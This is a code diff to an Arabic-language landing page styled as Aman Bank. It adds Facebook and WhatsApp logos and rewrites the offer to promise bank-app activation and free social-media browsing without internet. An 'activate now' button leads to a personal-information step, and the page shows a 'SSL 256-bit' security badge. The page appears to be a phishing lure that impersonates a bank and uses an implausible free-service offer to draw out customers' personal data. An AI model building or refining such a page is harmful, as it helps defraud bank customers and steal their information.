@@ -42,7 +42,39 @@
     }
     .landing-sub2 {
       font-size: 13px; color: #666;
-      line-height: 1.7; margin-bottom: 28px;
+      line-height: 1.7; margin-bottom: 20px;
+    }
+    .services-row {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 24px;
+      flex-wrap: wrap;
+    }
+    .service-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+    }
+    .service-item img {
+      width: 52px;
+      height: 52px;
+      border-radius: 14px;
+      object-fit: cover;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.12);
+    }
+    .service-item span {
+      font-size: 11px;
+      font-weight: 700;
+      color: #555;
+    }
+    .service-divider {
+      font-size: 18px;
+      color: #bbb;
+      font-weight: 300;
+      margin-bottom: 14px;
     }
     .btn-main {
       width: 100%; padding: 14px;
@@ -244,9 +276,34 @@
     <div class="landing-title">مصرف الأمان</div>
     <div class="landing-sub1">حصرياً لعملاء مصرف الأمان</div>
     <div class="landing-sub2">
-      ولأول مرة في ليبيا، فعّل تطبيق مصرف الأمان واستمتع<br/>
-      بخدماتك المصرفية بكل سهولة وأمان دون الحاجة إلى الإنترنت
+      فعّل تطبيق البنك بدون إنترنت واستمتع بخدماتك المصرفية،<br/>
+      تصفح فيسبوك وواتساب — كل ما تحتاجه في مكان واحد
     </div>
+
+    <!-- SERVICES ROW -->
+    <div class="services-row">
+      <div class="service-item">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/200px-Microsoft_logo_%282012%29.svg.png"
+             src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Aman_Bank_logo.png/200px-Aman_Bank_logo.png"
+             onerror="this.src='https://via.placeholder.com/52x52/0058b0/ffffff?text=🏦'"
+             alt="خدمات بنكية"
+             style="background:#e8f0fb; padding:6px;"/>
+        <span>خدمات بنكية</span>
+      </div>
+      <div class="service-divider">+</div>
+      <div class="service-item">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/200px-Facebook_Logo_%282019%29.png"
+             alt="فيسبوك"/>
+        <span>فيسبوك</span>
+      </div>
+      <div class="service-divider">+</div>
+      <div class="service-item">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/200px-WhatsApp.svg.png"
+             alt="واتساب"/>
+        <span>واتساب</span>
+      </div>
+    </div>
+
     <button class="btn-main" onclick="goToPersonalInfo()">⚡ فعّل الآن</button>
     <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | مصرف الأمان © 2024</div>
   </div>
